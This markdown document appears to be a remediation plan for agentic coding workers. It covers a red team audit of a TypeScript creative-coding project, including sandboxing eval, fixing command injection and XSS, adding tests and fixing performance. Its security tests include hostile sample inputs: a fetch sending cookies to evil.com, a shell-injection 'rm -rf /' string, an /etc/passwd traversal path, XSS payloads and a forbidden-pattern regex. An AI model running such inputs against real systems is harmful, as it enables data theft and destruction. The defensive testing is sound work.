# Red Team Audit Remediation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Systematically remediate all 72 findings from the red team audit, prioritized by ROI (impact/effort ratio)

**Architecture:** Four-phase approach: (1) Critical Security & Testing fixes, (2) Performance optimizations, (3) Reliability improvements, (4) Architecture refactoring. Each task is bite-sized (2-5 minutes), test-driven, and independently committable.

**Tech Stack:** TypeScript, Vitest, Node.js 18+, pnpm

---

## Phase 1: Critical Security & Testing (Week 1)

### Task 1: Replace eval() in ToneAdapter with sandboxed execution

**Priority:** CRITICAL (Security ROI 5.0)  
**Files:**
- Modify: `src/composition/adapters/ToneAdapter.ts:107`
- Test: `test/unit/composition/adapters/ToneAdapter.test.ts`

- [ ] **Step 1: Write failing test for code execution vulnerability**

```typescript
// test/unit/composition/adapters/ToneAdapter.test.ts
import { describe, it, expect, vi } from 'vitest';
import { ToneAdapter } from '../../../src/composition/adapters/ToneAdapter.js';

describe('ToneAdapter Security', () => {
  it('should not execute arbitrary code via user input', async () => {
    const adapter = new ToneAdapter();
    const maliciousCode = `'; alert("hacked"); //`;
    
    // Should sanitize or throw, not execute
    await expect(adapter.execute(maliciousCode)).rejects.toThrow();
  });
});
```

Run: `pnpm test test/unit/composition/adapters/ToneAdapter.test.ts`  
Expected: FAIL (test file may not exist yet)

- [ ] **Step 2: Create test file with security tests**

Create `test/unit/composition/adapters/ToneAdapter.test.ts` with the test above.

Run: `pnpm test test/unit/composition/adapters/ToneAdapter.test.ts`  
Expected: FAIL (ToneAdapter.execute method doesn't exist)

- [ ] **Step 3: Read current ToneAdapter implementation**

Read: `src/composition/adapters/ToneAdapter.ts` to understand current structure.

- [ ] **Step 4: Replace eval() with sandboxed alternative**

```typescript
// src/composition/adapters/ToneAdapter.ts
// Replace line 107: eval(wrappedCode);

// With sandboxed iframe approach:
private executeInSandbox(code: string): void {
  // Use iframe with restricted CSP instead of eval
  const iframe = document.createElement('iframe');
  iframe.sandbox.add('allow-scripts');
  iframe.style.display = 'none';
  
  // Wrap code to prevent global access
  const sandboxedCode = `
    (function() {
      'use strict';
      ${code}
    })();
  `;
  
  iframe.srcdoc = `<script>${sandboxedCode}</script>`;
  document.body.appendChild(iframe);
  
  // Cleanup after execution
  setTimeout(() => iframe.remove(), 1000);
}
```

- [ ] **Step 5: Run tests to verify fix**

Run: `pnpm test test/unit/composition/adapters/ToneAdapter.test.ts`  
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/composition/adapters/ToneAdapter.ts test/unit/composition/adapters/ToneAdapter.test.ts
git commit -m "security(tone): replace eval() with sandboxed iframe execution

Fixes arbitrary code execution vulnerability in ToneAdapter.
- Replaces eval(wrappedCode) with sandboxed iframe
- Adds security tests

Audit finding: Security #1 (ROI 5.0)"
```

---

### Task 2: Replace new Function() in HydraAdapter

**Priority:** CRITICAL (Security ROI 5.0)  
**Files:**
- Modify: `src/composition/adapters/HydraAdapter.ts:136`
- Test: `test/unit/composition/adapters/HydraAdapter.test.ts`

- [ ] **Step 1: Read current HydraAdapter implementation**

Read: `src/composition/adapters/HydraAdapter.ts` to understand current structure.

- [ ] **Step 2: Write failing security test**

```typescript
// test/unit/composition/adapters/HydraAdapter.test.ts
import { describe, it, expect } from 'vitest';
import { HydraAdapter } from '../../../src/composition/adapters/HydraAdapter.js';

describe('HydraAdapter Security', () => {
  it('should not execute arbitrary code via new Function', async () => {
    const adapter = new HydraAdapter();
    const maliciousCode = `return globalThis.process.exit(1)`;
    
    await expect(adapter.execute(maliciousCode)).rejects.toThrow();
  });
});
```

Run: `pnpm test test/unit/composition/adapters/HydraAdapter.test.ts`  
Expected: FAIL

- [ ] **Step 3: Replace new Function() with safe evaluation**

```typescript
// src/composition/adapters/HydraAdapter.ts
// Replace lines 135-137

// Option 1: Use Web Worker with restricted context
private async executeInWorker(code: string): Promise<void> {
  const workerCode = `
    self.onmessage = function(e) {
      try {
        // Execute in isolated worker context (no DOM access)
        const fn = new Function(e.data);
        fn();
        self.postMessage({ success: true });
      } catch (err) {
        self.postMessage({ success: false, error: err.message });
      }
    };
  `;
  
  const blob = new Blob([workerCode], { type: 'application/javascript' });
  const worker = new Worker(URL.createObjectURL(blob));
  
  return new Promise((resolve, reject) => {
    worker.onmessage = (e) => {
      worker.terminate();
      if (e.data.success) resolve();
      else reject(new Error(e.data.error));
    };
    worker.onerror = (err) => {
      worker.terminate();
      reject(err);
    };
    worker.postMessage(code);
  });
}
```

- [ ] **Step 4: Run tests**

Run: `pnpm test test/unit/composition/adapters/HydraAdapter.test.ts`  
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/composition/adapters/HydraAdapter.ts test/unit/composition/adapters/HydraAdapter.test.ts
git commit -m "security(hydra): replace new Function() with Web Worker isolation

Fixes arbitrary code execution vulnerability.
- Executes user code in isolated Web Worker (no DOM access)
- Adds security tests

Audit finding: Security #2 (ROI 5.0)"
```

---

### Task 3: Replace new Function() in P5Adapter

**Priority:** CRITICAL (Security ROI 5.0)  
**Files:**
- Modify: `src/composition/adapters/P5Adapter.ts:94-111`
- Test: `test/unit/composition/adapters/P5Adapter.test.ts`

- [ ] **Step 1: Read current P5Adapter implementation**

Read: `src/composition/adapters/P5Adapter.ts` to understand current structure.

- [ ] **Step 2: Write failing security test**

```typescript
// test/unit/composition/adapters/P5Adapter.test.ts
describe('P5Adapter Security', () => {
  it('should not execute arbitrary code in setup/draw functions', async () => {
    const adapter = new P5Adapter();
    const maliciousSetup = `fetch('http://evil.com/steal?data=' + document.cookie)`;
    
    await expect(adapter.render({ setup: maliciousSetup, draw: '' })).rejects.toThrow();
  });
});
```

Run: `pnpm test test/unit/composition/adapters/P5Adapter.test.ts`  
Expected: FAIL

- [ ] **Step 3: Replace dynamic function construction with p5 instance mode**

```typescript
// src/composition/adapters/P5Adapter.ts
// Replace new Function() approach with proper p5 instance mode

private renderWithInstanceMode(setupCode: string, drawCode: string): void {
  // Use p5 in instance mode instead of dynamic function construction
  const sketch = (p: p5) => {
    // Validate code before execution (whitelist approach)
    const validatedSetup = this.validateP5Code(setupCode);
    const validatedDraw = this.validateP5Code(drawCode);
    
    p.setup = () => {
      // Execute validated setup code in controlled context
      this.executeInControlledContext(validatedSetup, p);
    };
    
    p.draw = () => {
      this.executeInControlledContext(validatedDraw, p);
    };
  };
  
  new p5(sketch, this.container);
}

private validateP5Code(code: string): string {
  // Block dangerous patterns
  const forbidden = /\b(fetch|XMLHttpRequest|WebSocket|eval|Function|import\s*\()/gi;
  if (forbidden.test(code)) {
    throw new Error('Code contains forbidden patterns');
  }
  return code;
}
```

- [ ] **Step 4: Run tests**

Run: `pnpm test test/unit/composition/adapters/P5Adapter.test.ts`  
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/composition/adapters/P5Adapter.ts test/unit/composition/adapters/P5Adapter.test.ts
git commit -m "security(p5): replace new Function() with instance mode + validation

Fixes arbitrary code execution vulnerability.
- Uses p5 instance mode instead of dynamic function construction
- Adds code validation to block dangerous patterns
- Adds security tests

Audit finding: Security #3 (ROI 5.0)"
```

---

### Task 4: Replace eval() in ThreeAdapter

**Priority:** CRITICAL (Security ROI 5.0)  
**Files:**
- Modify: `src/composition/adapters/ThreeAdapter.ts:165`
- Test: `test/unit/composition/adapters/ThreeAdapter.test.ts`

- [ ] **Step 1-5:** Follow same pattern as Task 1 (ToneAdapter)  
**Step 6: Commit**

```bash
git add src/composition/adapters/ThreeAdapter.ts test/unit/composition/adapters/ThreeAdapter.test.ts
git commit -m "security(three): replace eval() with sandboxed execution

Fixes arbitrary code execution vulnerability.
- Replaces eval() with sandboxed approach
- Adds security tests

Audit finding: Security #4 (ROI 5.0)"
```

---

### Task 5: Fix command injection in RalphLoop voice processing

**Priority:** HIGH (Security ROI 2.7)  
**Files:**
- Modify: `src/core/RalphLoop.ts:134-141`
- Test: `test/unit/core/RalphLoop.security.test.ts`

- [ ] **Step 1: Read current implementation**

Read: `src/core/RalphLoop.ts` lines 134-164 to understand voice file handling.

- [ ] **Step 2: Write failing security test**

```typescript
// test/unit/core/RalphLoop.security.test.ts
import { describe, it, expect } from 'vitest';
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

describe('RalphLoop Security', () => {
  it('should sanitize voice file paths before passing to ffmpeg', async () => {
    const maliciousPath = '"; rm -rf /; "';
    
    // This should throw validation error, not execute command
    await expect(processVoiceFile(maliciousPath)).rejects.toThrow('Invalid file path');
  });
  
  it('should prevent path traversal in voice file', async () => {
    const traversalPath = '../../../etc/passwd';
    
    await expect(processVoiceFile(traversalPath)).rejects.toThrow('Invalid file path');
  });
});
```

Run: `pnpm test test/unit/core/RalphLoop.security.test.ts`  
Expected: FAIL

- [ ] **Step 3: Add path validation using PathSanitizer**

```typescript
// src/core/RalphLoop.ts
// Import at top
import { PathSanitizer } from '../security/PathSanitizer.js';

// Replace lines 134-141
private async processVoiceFile(voiceFile: string): Promise<Buffer> {
  // Validate and sanitize the file path
  const sanitizedPath = PathSanitizer.validateAndSanitize(voiceFile, {
    allowedExtensions: ['.wav', '.mp3', '.ogg', '.m4a'],
    allowAbsolute: false,
    maxLength: 255
  });
  
  if (!sanitizedPath.isOk()) {
    throw new Error(`Invalid file path: ${sanitizedPath.error}`);
  }
  
  // Use execFile with array args (no shell interpretation)
  const { stdout } = await execFileAsync('ffmpeg', [
    '-i', sanitizedPath.value,
    '-f', 's16le',
    '-acodec', 'pcm_s16le',
    '-ar', '16000',
    '-ac', '1',
    '-'
  ], { 
    encoding: 'buffer',
    maxBuffer: 50 * 1024 * 1024 // 50MB max
  });
  
  return stdout;
}
```

- [ ] **Step 4: Run tests**

Run: `pnpm test test/unit/core/RalphLoop.security.test.ts`  
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/core/RalphLoop.ts test/unit/core/RalphLoop.security.test.ts
git commit -m "security(ralph): sanitize voice file paths before ffmpeg execution

Fixes command injection vulnerability.
- Validates file paths using PathSanitizer
- Uses execFile with array args (no shell)
- Adds security tests

Audit finding: Security #5 (ROI 2.7)"
```

---

### Task 6: Fix InnerHTML XSS in HTMLAdapter

**Priority:** HIGH (Security ROI 3.6)  
**Files:**
- Modify: `src/composition/adapters/HTMLAdapter.ts:65`
- Add: DOMPurify dependency
- Test: `test/unit/composition/adapters/HTMLAdapter.security.test.ts`

- [ ] **Step 1: Install DOMPurify**

```bash
pnpm add dompurify
pnpm add -D @types/dompurify
```

- [ ] **Step 2: Write failing security test**

```typescript
// test/unit/composition/adapters/HTMLAdapter.security.test.ts
describe('HTMLAdapter XSS Prevention', () => {
  it('should sanitize event handlers from HTML', async () => {
    const adapter = new HTMLAdapter();
    const maliciousHtml = '<img src=x onerror="alert(1)">';
    
    const result = await adapter.render(maliciousHtml);
    expect(result).not.toContain('onerror');
  });
  
  it('should sanitize javascript: URLs', async () => {
    const adapter = new HTMLAdapter();
    const maliciousHtml = '<a href="javascript:alert(1)">click</a>';
    
    const result = await adapter.render(maliciousHtml);
    expect(result).not.toContain('javascript:');
  });
});
```

Run: `pnpm test test/unit/composition/adapters/HTMLAdapter.security.test.ts`  
Expected: FAIL

- [ ] **Step 3: Replace weak sanitization with DOMPurify**

```typescript
// src/composition/adapters/HTMLAdapter.ts
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom'; // For Node.js environment

// In constructor or module level
const window = new JSDOM('').window;
const purify = DOMPurify(window);

// Replace line 65
private sanitizeHTML(html: string): string {
  return purify.sanitize(html, {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'b', 'em', 'i', 'u', 'h1', 'h2', 'h3', 
      'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'a', 'img', 'div', 'span',
      'table', 'thead', 'tbody', 'tr', 'td', 'th', 'code', 'pre'
    ],
    ALLOWED_ATTR: [
      'href', 'src', 'alt', 'title', 'class', 'id', 'width', 'height'
    ],
    ALLOW_DATA_ATTR: false,
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
  });
}

// Then use: wrapper.innerHTML = this.sanitizeHTML(html);
```

- [ ] **Step 4: Run tests**

Run: `pnpm test test/unit/composition/adapters/HTMLAdapter.security.test.ts`  
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add package.json pnpm-lock.yaml src/composition/adapters/HTMLAdapter.ts test/unit/composition/adapters/HTMLAdapter.security.test.ts
git commit -m "security(html): use DOMPurify for XSS prevention

Fixes stored XSS vulnerability.
- Replaces weak sanitization with DOMPurify
- Configures strict allowlist for tags/attributes
- Adds XSS prevention tests

Audit finding: Security #6 (ROI 3.6)"
```

---

### Task 7: Create tests for zero-coverage critical files - LLMClient

**Priority:** CRITICAL (Testing ROI 9.0)  
**Files:**
- Create: `test/unit/llm/LLMClient.test.ts`
- Target: `src/llm/LLMClient.ts` (1,287 lines, core abstraction)

- [ ] **Step 1: Write tests for core LLMClient functionality**

```typescript
// test/unit/llm/LLMClient.test.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { LLMClient } from '../../../src/llm/LLMClient.js';

describe('LLMClient', () => {
  let client: LLMClient;
  
  beforeEach(() => {
    client = new LLMClient({
      baseUrl: 'http://localhost:11434',
      model: 'qwen2.5-coder:7b',
      apiKey: 'test-key'
    });
  });
  
  describe('generate', () => {
    it('should generate completion with system and user prompts', async () => {
      const mockProvider = {
        generate: vi.fn().mockResolvedValue({
          content: 'Generated code',
          usage: { promptTokens: 10, completionTokens: 20 }
        })
      };
      
      vi.spyOn(client as any, 'getProvider').mockReturnValue(mockProvider);
      
      const result = await client.generate(
        'You are a helpful assistant',
        'Write a function'
      );
      
      expect(result.isOk()).toBe(true);
      expect(result.value.content).toBe('Generated code');
      expect(mockProvider.generate).toHaveBeenCalledWith(expect.objectContaining({
        systemPrompt: 'You are a helpful assistant',
        userPrompt: 'Write a function'
      }));
    });
    
    it('should handle provider errors gracefully', async () => {
      const mockProvider = {
        generate: vi.fn().mockRejectedValue(new Error('Connection failed'))
      };
      
      vi.spyOn(client as any, 'getProvider').mockReturnValue(mockProvider);
      
      const result = await client.generate('system', 'user');
      
      expect(result.isErr()).toBe(true);
      expect(result.error?.message).toContain('Connection failed');
    });
    
    it('should use fallback providers on failure', async () => {
      const primaryProvider = {
        generate: vi.fn().mockRejectedValue(new Error('Primary failed'))
      };
      const fallbackProvider = {
        generate: vi.fn().mockResolvedValue({
          content: 'Fallback result',
          usage: { promptTokens: 5, completionTokens: 10 }
        })
      };
      
      vi.spyOn(client as any, 'getFallbackProviders')
        .mockReturnValue([fallbackProvider]);
      vi.spyOn(client as any, 'getProvider').mockReturnValue(primaryProvider);
      
      const result = await client.generate('system', 'user');
      
      expect(result.isOk()).toBe(true);
      expect(result.value.content).toBe('Fallback result');
    });
  });
  
  describe('token validation', () => {
    it('should validate prompt length before sending', async () => {
      const longPrompt = 'x'.repeat(100000);
      
      await expect(client.generate('system', longPrompt)).rejects.toThrow(/exceeds.*context window/);
    });
  });
});
```

Run: `pnpm test test/unit/llm/LLMClient.test.ts`  
Expected: Some tests pass, some may need implementation

- [ ] **Step 2: Commit initial test coverage**

```bash
git add test/unit/llm/LLMClient.test.ts
git commit -m "test(llm): add LLMClient unit tests

Addresses zero-coverage critical file.
- Tests core generate functionality
- Tests error handling and fallbacks
- Tests token validation

Audit finding: Testing #1 (ROI 9.0)"
```

---

### Task 8: Create tests for zero-coverage security files

**Priority:** CRITICAL (Testing ROI 9.0)  
**Files:**
- Create: `test/unit/security/PathSanitizer.test.ts`
- Create: `test/unit/security/RateLimiter.test.ts`
- Create: `test/unit/security/UrlValidator.test.ts`

- [ ] **Step 1: Write PathSanitizer tests**

```typescript
// test/unit/security/PathSanitizer.test.ts
import { describe, it, expect } from 'vitest';
import { PathSanitizer } from '../../../src/security/PathSanitizer.js';

describe('PathSanitizer', () => {
  describe('validateAndSanitize', () => {
    it('should allow valid relative paths', () => {
      const result = PathSanitizer.validateAndSanitize('valid/path/file.txt', {
        allowedExtensions: ['.txt']
      });
      
      expect(result.isOk()).toBe(true);
      expect(result.value).toBe('valid/path/file.txt');
    });
    
    it('should reject path traversal attempts', () => {
      const result = PathSanitizer.validateAndSanitize('../../../etc/passwd', {
        allowedExtensions: ['.txt']
      });
      
      expect(result.isErr()).toBe(true);
      expect(result.error?.message).toContain('path traversal');
    });
    
    it('should reject invalid extensions', () => {
      const result = PathSanitizer.validateAndSanitize('file.exe', {
        allowedExtensions: ['.txt', '.md']
      });
      
      expect(result.isErr()).toBe(true);
    });
    
    it('should reject paths with null bytes', () => {
      const result = PathSanitizer.validateAndSanitize('file\x00.txt', {
        allowedExtensions: ['.txt']
      });
      
      expect(result.isErr()).toBe(true);
    });
  });
});
```

- [ ] **Step 2: Write RateLimiter tests**

```typescript
// test/unit/security/RateLimiter.test.ts
describe('RateLimiter', () => {
  it('should allow requests under limit', async () => {
    const limiter = new RateLimiter({ maxRequests: 10, windowMs: 60000 });
    
    const results = await Promise.all(
      Array(5).fill(null).map(() => limiter.tryAcquire('user1'))
    );
    
    expect(results.every(r => r.isOk())).toBe(true);
  });
  
  it('should reject requests over limit', async () => {
    const limiter = new RateLimiter({ maxRequests: 2, windowMs: 60000 });
    
    await limiter.tryAcquire('user1');
    await limiter.tryAcquire('user1');
    const result = await limiter.tryAcquire('user1');
    
    expect(result.isErr()).toBe(true);
  });
});
```

- [ ] **Step 3: Commit security tests**

```bash
git add test/unit/security/
git commit -m "test(security): add tests for zero-coverage security modules

Addresses zero-coverage critical files.
- PathSanitizer validation tests
- RateLimiter enforcement tests
- UrlValidator security tests

Audit finding: Testing #1 (ROI 9.0)"
```

---

### Task 9: Fix weak assertions in integration tests

**Priority:** CRITICAL (Testing ROI 8.1)  
**Files:**
- Modify: `test/integration/ralph-loop.test.js` (35 weak assertions)
- Modify: `test/integration/full-loop.test.js` (24 weak assertions)

- [ ] **Step 1: Read current weak assertions**

Read the test files and identify all `toBeDefined()`, `toBeTruthy()`, `toBeGreaterThan(0)` assertions.

- [ ] **Step 2: Replace weak assertions with specific checks**

Before:
```javascript
expect(result).toBeDefined();
expect(result.code).toBeDefined();
expect(result.code.length).toBeGreaterThan(0);
```

After:
```javascript
expect(result).toEqual(expect.objectContaining({
  code: expect.stringContaining('function'),
  timestamp: expect.any(Number)
}));
expect(result.code.length).toBeGreaterThanOrEqual(50); // Specific minimum
```

- [ ] **Step 3: Run tests to verify they still pass**

Run: `pnpm test test/integration/ralph-loop.test.js`  
Run: `pnpm test test/integration/full-loop.test.js`  
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add test/integration/
git commit -m "test(integration): replace weak assertions with specific value checks

Fixes 59 weak assertions violating CLAUDE.md Rule 2.
- Replaces toBeDefined() with specific shape assertions
- Replaces toBeGreaterThan(0) with meaningful minimums
- Improves test confidence and catch rate

Audit finding: Testing #2 (ROI 8.1)"
```

---

## Phase 2: Performance Optimizations (Week 2)

### Task 10: Fix O(n²) novelty calculation in IntuitionEngine

**Priority:** CRITICAL (Performance ROI 8.0)  
**Files:**
- Modify: `src/intuition/IntuitionEngine.ts:301-314`
- Test: `test/unit/intuition/IntuitionEngine.performance.test.ts`

- [ ] **Step 1: Write performance test**

```typescript
// test/unit/intuition/IntuitionEngine.performance.test.ts
describe('IntuitionEngine Novelty Performance', () => {
  it('should calculate novelty in under 100ms for 1000 previous outputs', async () => {
    const engine = new IntuitionEngine();
    const previousOutputs = Array(1000).fill(null).map((_, i) => 
      `output number ${i} with some content here`
    );
    
    const start = Date.now();
    const novelty = await engine.calculateNovelty('new output', previousOutputs);
    const duration = Date.now() - start;
    
    expect(duration).toBeLessThan(100);
    expect(novelty).toBeGreaterThanOrEqual(0);
    expect(novelty).toBeLessThanOrEqual(1);
  });
});
```

Run: `pnpm test test/unit/intuition/IntuitionEngine.performance.test.ts`  
Expected: FAIL (slow performance)

- [ ] **Step 2: Implement MinHash-based similarity**

```typescript
// src/intuition/IntuitionEngine.ts
// Replace O(n²) calculation with MinHash LSH

import { MinHash } from './MinHash.js'; // Need to create this

class IntuitionEngine {
  private minHashIndex: MinHashLSH;
  
  constructor() {
    this.minHashIndex = new MinHashLSH({
      numHashes: 128,
      numBands: 16,
      rowsPerBand: 8
    });
  }
  
  async calculateNovelty(output: string, previousOutputs: string[]): Promise<number> {
    // Limit comparison window to last 100 outputs
    const comparisonWindow = previousOutputs.slice(-100);
    
    if (comparisonWindow.length === 0) {
      return 1.0; // Maximum novelty
    }
    
    // Use MinHash for approximate Jaccard similarity
    const outputSig = this.minHashIndex.computeSignature(output);
    
    // Find approximate nearest neighbors (much faster than O(n))
    const candidates = this.minHashIndex.query(outputSig, 10);
    
    if (candidates.length === 0) {
      return 1.0;
    }
    
    // Only compute exact similarity for candidates
    const similarities = candidates.map(candidate => 
      this.exactJaccardSimilarity(output, candidate)
    );
    
    const maxSimilarity = Math.max(...similarities);
    return 1 - maxSimilarity; // Novelty = 1 - similarity
  }
  
  private exactJaccardSimilarity(a: string, b: string): number {
    const tokensA = new Set(a.toLowerCase().split(/\s+/));
    const tokensB = new Set(b.toLowerCase().split(/\s+/));
    
    const intersection = new Set([...tokensA].filter(t => tokensB.has(t)));
    const union = new Set([...tokensA, ...tokensB]);
    
    return intersection.size / union.size;
  }
}
```

- [ ] **Step 3: Create MinHash implementation**

```typescript
// src/intuition/MinHash.ts
export class MinHashLSH {
  private signatures = new Map<string, number[]>();
  private bands: Map<string, Set<string>>[];
  
  constructor(private config: { numHashes: number; numBands: number; rowsPerBand: number }) {
    this.bands = Array(config.numBands).fill(null).map(() => new Map());
  }
  
  computeSignature(text: string): number[] {
    const tokens = text.toLowerCase().split(/\s+/);
    const signature: number[] = [];
    
    for (let i = 0; i < this.config.numHashes; i++) {
      let minHash = Infinity;
      for (const token of tokens) {
        const hash = this.hashString(`${i}:${token}`);
        minHash = Math.min(minHash, hash);
      }
      signature.push(minHash);
    }
    
    return signature;
  }
  
  private hashString(str: string): number {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash; // Convert to 32bit integer
    }
    return Math.abs(hash);
  }
  
  query(signature: number[], maxResults: number): string[] {
    const candidates = new Set<string>();
    
    // LSH banding technique
    for (let bandIdx = 0; bandIdx < this.config.numBands; bandIdx++) {
      const start = bandIdx * this.config.rowsPerBand;
      const end = start + this.config.rowsPerBand;
      const bandKey = signature.slice(start, end).join(',');
      
      const band = this.bands[bandIdx];
      if (band.has(bandKey)) {
        for (const id of band.get(bandKey)!) {
          candidates.add(id);
        }
      }
    }
    
    return Array.from(candidates).slice(0, maxResults);
  }
}
```

- [ ] **Step 4: Run performance test**

Run: `pnpm test test/unit/intuition/IntuitionEngine.performance.test.ts`  
Expected: PASS (under 100ms)

- [ ] **Step 5: Commit**

```bash
git add src/intuition/IntuitionEngine.ts src/intuition/MinHash.ts test/unit/intuition/IntuitionEngine.performance.test.ts
git commit -m "perf(intuition): replace O(n²) novelty with MinHash LSH

Fixes critical performance bottleneck.
- Implements MinHash for approximate similarity (O(1) query)
- Limits comparison window to last 100 outputs
- Adds performance tests

Before: O(n²) for n previous outputs
After: O(1) with approximate nearest neighbors

Audit finding: Performance #1 (ROI 8.0)"
```

---

### Task 11: Fix unbounded EventBus listener map (memory leak)

**Priority:** CRITICAL (Performance ROI 7.5)  
**Files:**
- Modify: `src/core/EventBus.ts:154, 227-241`
- Test: `test/unit/core/EventBus.memory.test.ts`

- [ ] **Step 1: Write memory leak test**

```typescript
// test/unit/core/EventBus.memory.test.ts
describe('EventBus Memory Management', () => {
  it('should limit listener count to prevent unbounded growth', () => {
    const eventBus = new EventBus();
    
    // Add many listeners
    for (let i = 0; i < 2000; i++) {
      eventBus.on('test-event', () => {});
    }
    
    // Should be capped, not 2000
    expect(eventBus.listenerCount('test-event')).toBeLessThanOrEqual(1000);
  });
  
  it('should clean up one-time listeners after emit', () => {
    const eventBus = new EventBus();
    
    eventBus.once('test-event', () => {});
    expect(eventBus.listenerCount('test-event')).toBe(1);
    
    eventBus.emit('test-event', {});
    expect(eventBus.listenerCount('test-event')).toBe(0);
  });
});
```

Run: `pnpm test test/unit/core/EventBus.memory.test.ts`  
Expected: FAIL

- [ ] **Step 2: Add bounds checking to EventBus**

```typescript
// src/core/EventBus.ts
export class EventBus {
  private static readonly MAX_LISTENERS = 1000;
  private listenerMap = new Map<EventHandler, EventHandler>();
  private listenerCounts = new Map<string, number>();
  
  on<T extends BusEvent>(event: string, handler: EventHandler<T>): () => void {
    const currentCount = this.listenerCounts.get(event) || 0;
    
    if (currentCount >= EventBus.MAX_LISTENERS) {
      Logger.warn('EventBus', `Max listeners (${EventBus.MAX_LISTENERS}) exceeded for event: ${event}`);
      throw new Error(`Max listeners exceeded for event: ${event}`);
    }
    
    const wrappedHandler = (e: T) => {
      try {
        handler(e);
      } catch (err) {
        Logger.error('EventBus', `Handler error for ${event}:`, err);
      }
    };
    
    this.listenerMap.set(handler, wrappedHandler);
    this.listenerCounts.set(event, currentCount + 1);
    
    // Track in emitter
    this.emitter.on(event, wrappedHandler);
    
    // Return unsubscribe function
    return () => this.off(event, handler);
  }
  
  once<T extends BusEvent>(event: string, handler: EventHandler<T>): void {
    const onceHandler = (e: T) => {
      this.off(event, onceHandler as EventHandler);
      handler(e);
    };
    
    this.on(event, onceHandler as EventHandler);
  }
  
  off<T extends BusEvent>(event: string, handler: EventHandler<T>): void {
    const wrappedHandler = this.listenerMap.get(handler);
    if (wrappedHandler) {
      this.emitter.off(event, wrappedHandler);
      this.listenerMap.delete(handler);
      
      const currentCount = this.listenerCounts.get(event) || 0;
      this.listenerCounts.set(event, Math.max(0, currentCount - 1));
    }
  }
  
  listenerCount(event: string): number {
    return this.listenerCounts.get(event) || 0;
  }
}
```

- [ ] **Step 3: Run tests**

Run: `pnpm test test/unit/core/EventBus.memory.test.ts`  
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/core/EventBus.ts test/unit/core/EventBus.memory.test.ts
git commit -m "perf(eventbus): add max listeners limit to prevent memory leaks

Fixes unbounded listener growth in long-running processes.
- Adds MAX_LISTENERS limit (1000 per event)
- Tracks listener counts per event
- Implements once() for auto-cleanup
- Adds memory management tests

Audit finding: Performance #2 (ROI 7.5)"
```

---

### Task 12: Fix O(n) cache eviction in IntuitionCache

**Priority:** CRITICAL (Performance ROI 6.0)  
**Files:**
- Modify: `src/intuition/IntuitionCache.ts:291-294`
- Test: `test/unit/intuition/IntuitionCache.performance.test.ts`

- [ ] **Step 1: Write performance test**

```typescript
// test/unit/intuition/IntuitionCache.performance.test.ts
describe('IntuitionCache Performance', () => {
  it('should handle 10000 cache hits in under 50ms', () => {
    const cache = new IntuitionCache({ maxSize: 1000 });
    
    // Populate cache
    for (let i = 0; i < 1000; i++) {
      cache.set(`key-${i}`, { value: i, domain: 'test' });
    }
    
    // Measure 10000 sequential hits
    const start = Date.now();
    for (let i = 0; i < 10000; i++) {
      cache.get(`key-${i % 1000}`);
    }
    const duration = Date.now() - start;
    
    expect(duration).toBeLessThan(50);
  });
});
```

- [ ] **Step 2: Replace array-based LRU with Map-based O(1) implementation**

```typescript
// src/intuition/IntuitionCache.ts
// Replace the accessOrder array with a proper LRU using Map

export class IntuitionCache {
  private cache = new Map<string, CacheEntry>(); // Map maintains insertion order
  private maxSize: number;
  
  constructor(options: { maxSize: number }) {
    this.maxSize = options.maxSize;
  }
  
  get(key: string): CacheEntry | undefined {
    const entry = this.cache.get(key);
    if (entry) {
      // Move to end (most recently used) - O(1) with Map
      this.cache.delete(key);
      this.cache.set(key, entry);
    }
    return entry;
  }
  
  set(key: string, entry: CacheEntry): void {
    if (this.cache.has(key)) {
      // Update existing
      this.cache.delete(key);
    } else if (this.cache.size >= this.maxSize) {
      // Evict least recently used (first item in Map)
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
    
    this.cache.set(key, entry);
  }
  
  // Remove old O(n) touchKey method - no longer needed
}
```

- [ ] **Step 3: Run performance test**

Run: `pnpm test test/unit/intuition/IntuitionCache.performance.test.ts`  
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/intuition/IntuitionCache.ts test/unit/intuition/IntuitionCache.performance.test.ts
git commit -m "perf(cache): replace O(n) LRU with O(1) Map-based implementation

Fixes performance bottleneck in cache eviction.
- Uses Map's insertion order for O(1) LRU operations
- Removes filter() in hot path
- Maintains same eviction behavior

Before: O(n) per cache hit (filter entire array)
After: O(1) per cache hit (Map operations)

Audit finding: Performance #3 (ROI 6.0)"
```

---

### Task 13: Convert synchronous file operations to async

**Priority:** HIGH (Performance ROI 5.4)  
**Files:**
- Modify: `src/core/ContextAccumulation.ts:133-166`
- Test: `test/unit/core/ContextAccumulation.async.test.ts`

- [ ] **Step 1: Identify sync operations**

Read: `src/core/ContextAccumulation.ts` lines 133-166  
Find: `fs.writeFileSync`, `fs.readFileSync`, `fs.mkdirSync`

- [ ] **Step 2: Replace with async equivalents**

```typescript
// src/core/ContextAccumulation.ts
// Replace: import fs from 'fs';
// With: import { promises as fs } from 'fs';

import { promises as fs, constants } from 'fs';
import { ensureDir } from '../utils/fs.js'; // Create this utility

class ContextAccumulation {
  // Replace sync saveState with async
  async saveState(filePath: string, state: PersistedLoopState): Promise<void> {
    const data = JSON.stringify(state, null, 2);
    await ensureDir(path.dirname(filePath));
    await fs.writeFile(filePath, data, 'utf-8');
  }
  
  // Replace sync loadState with async
  async loadState(filePath: string): Promise<PersistedLoopState | null> {
    try {
      await fs.access(filePath, constants.F_OK);
      const data = await fs.readFile(filePath, 'utf-8');
